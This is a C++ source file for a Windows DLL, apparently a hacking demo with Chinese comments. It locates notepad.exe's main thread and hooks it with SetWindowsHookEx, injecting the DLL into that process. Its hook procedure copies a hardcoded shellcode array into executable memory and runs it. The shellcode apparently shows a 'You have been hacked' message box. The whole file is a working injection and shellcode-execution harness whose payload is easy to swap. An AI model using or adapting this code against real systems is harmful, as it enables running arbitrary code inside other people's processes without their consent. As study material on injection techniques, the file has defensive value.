// NotepadHook.cpp : 定义 DLL 应用程序的入口点。
//需要被编译为 x64

#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>
#pragma data_seg("myhookhandle")
HHOOK g_hHook = NULL;
#pragma data_seg()
#pragma comment(linker,"/SECTION:myhookhandle,RWS")


HMODULE g_hModule = NULL;

DWORD GetMainThreadIdFromName(LPCSTR szName);


// 由进程名获取主线程ID(需要头文件tlhelp32.h)
// 失败返回0
DWORD GetMainThreadIdFromName(LPCSTR szName)
{
	DWORD idThread = 0;         // 进程ID
	DWORD idProcess = 0;        // 主线程ID

	// 获取进程ID
	PROCESSENTRY32 pe;      // 进程信息
	pe.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // 获取系统进程列表
	if (Process32First(hSnapshot, &pe))      // 返回系统中第一个进程的信息
	{
		do
		{
			if (0 == _stricmp(pe.szExeFile, szName)) // 不区分大小写比较
			{
				idProcess = pe.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe));      // 下一个进程
	}
	CloseHandle(hSnapshot); // 删除快照
	if (idProcess == 0)
	{
		return 0;
	}

	// 获取进程的主线程ID
	THREADENTRY32 te;       // 线程信息
	te.dwSize = sizeof(THREADENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); // 系统所有线程快照
	if (Thread32First(hSnapshot, &te))       // 第一个线程
	{
		do
		{
			if (idProcess == te.th32OwnerProcessID)      // 认为找到的第一个该进程的线程为主线程
			{
				idThread = te.th32ThreadID;
				break;
			}
		} while (Thread32Next(hSnapshot, &te));           // 下一个线程
	}
	CloseHandle(hSnapshot); // 删除快照
	return idThread;
}




BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_hModule = hModule;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

LRESULT MyFunction(int code, WPARAM wParam, LPARAM lParam) {
	unsigned char shellcode[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
		"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
		"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
		"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
		"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
		"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
		"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
		"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
		"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
		"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
		"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
		"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
		"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
		"\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
		"\x85\x33\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
		"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
		"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
		"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x59\x6f\x75\x20\x68"
		"\x61\x76\x65\x20\x62\x65\x65\x6e\x20\x68\x61\x63\x6b\x65\x64"
		"\x20\x5e\x5f\x5e\x00\x49\x6d\x70\x6f\x72\x74\x61\x6e\x74\x20"
		"\x57\x61\x72\x6e\x69\x6e\x67\x21\x00";
	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();
	return CallNextHookEx(g_hHook, code, wParam, lParam);
}

EXTERN_C __declspec(dllexport) BOOL SetGlobalHook() {
	g_hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)MyFunction, g_hModule, GetMainThreadIdFromName("notepad.exe"));
	if (!g_hHook)
	{
		return FALSE;
	}
	return TRUE;
}

EXTERN_C __declspec(dllexport) BOOL UnsetGlobalHook() {
	if (g_hHook)
	{
		UnhookWindowsHookEx(g_hHook);
	}
	return TRUE;
}
